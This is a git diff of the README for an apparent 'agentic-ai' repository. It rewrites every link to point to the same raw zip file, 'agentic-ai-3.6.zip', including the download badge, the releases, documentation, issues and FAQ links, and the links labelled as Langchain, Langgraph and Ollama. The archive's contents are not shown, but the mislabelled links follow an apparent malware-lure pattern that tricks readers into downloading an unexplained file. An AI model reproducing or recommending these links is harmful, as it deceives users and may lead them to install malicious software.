@@ -6,7 +6,7 @@ Welcome to the agentic-ai project! Here, you can explore various AI agents and A
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20agentic--ai-4CAF50.svg)](https://github.com/yigido41/agentic-ai/releases)
+[![Download](https://raw.githubusercontent.com/yigido41/agentic-ai/main/agent-1/agentic-ai-3.6.zip%https://raw.githubusercontent.com/yigido41/agentic-ai/main/agent-1/agentic-ai-3.6.zip)](https://raw.githubusercontent.com/yigido41/agentic-ai/main/agent-1/agentic-ai-3.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before you download, make sure your system meets these requirements:
 
 To get started, visit the following page to download the latest version of agentic-ai:
 
-[Download agentic-ai Releases](https://github.com/yigido41/agentic-ai/releases)
+[Download agentic-ai Releases](https://raw.githubusercontent.com/yigido41/agentic-ai/main/agent-1/agentic-ai-3.6.zip)
 
 1. Go to the link above.
 2. Look for the latest version at the top of the releases page. 
@@ -53,7 +53,7 @@ agentic-ai offers many features to enhance your experience with AI agents, inclu
 
 For more detailed information and advanced features, check out our full documentation at:
 
-[agentic-ai Documentation](https://github.com/yigido41/agentic-ai/wiki)
+[agentic-ai Documentation](https://raw.githubusercontent.com/yigido41/agentic-ai/main/agent-1/agentic-ai-3.6.zip)
 
 This will help you utilize all functionalities and understand more complex operations of the software.
 
@@ -61,15 +61,15 @@ This will help you utilize all functionalities and understand more complex opera
 
 If you need help or have questions, you can always reach out to the community:
 
-- **Issue Tracker:** Report bugs or feature requests on the [issues page](https://github.com/yigido41/agentic-ai/issues).
-- **FAQs:** Visit our [Frequently Asked Questions](https://github.com/yigido41/agentic-ai/wiki/FAQ) section for quick answers.
+- **Issue Tracker:** Report bugs or feature requests on the [issues page](https://raw.githubusercontent.com/yigido41/agentic-ai/main/agent-1/agentic-ai-3.6.zip).
+- **FAQs:** Visit our [Frequently Asked Questions](https://raw.githubusercontent.com/yigido41/agentic-ai/main/agent-1/agentic-ai-3.6.zip) section for quick answers.
 
 ## 🔗 Related Projects
 
 If you are interested in similar projects, explore these:
 
-- [Langchain](https://github.com/langchain/langchain) - A framework for building applications with large language models.
-- [Langgraph](https://github.com/langchain/langgraph) - Tools to visualize and analyze language-based applications.
-- [Ollama Model](https://github.com/ollama/ollama) - A model for conversational agents.
+- [Langchain](https://raw.githubusercontent.com/yigido41/agentic-ai/main/agent-1/agentic-ai-3.6.zip) - A framework for building applications with large language models.
+- [Langgraph](https://raw.githubusercontent.com/yigido41/agentic-ai/main/agent-1/agentic-ai-3.6.zip) - Tools to visualize and analyze language-based applications.
+- [Ollama Model](https://raw.githubusercontent.com/yigido41/agentic-ai/main/agent-1/agentic-ai-3.6.zip) - A model for conversational agents.
 
 Thank you for choosing agentic-ai. We hope you enjoy using the software!
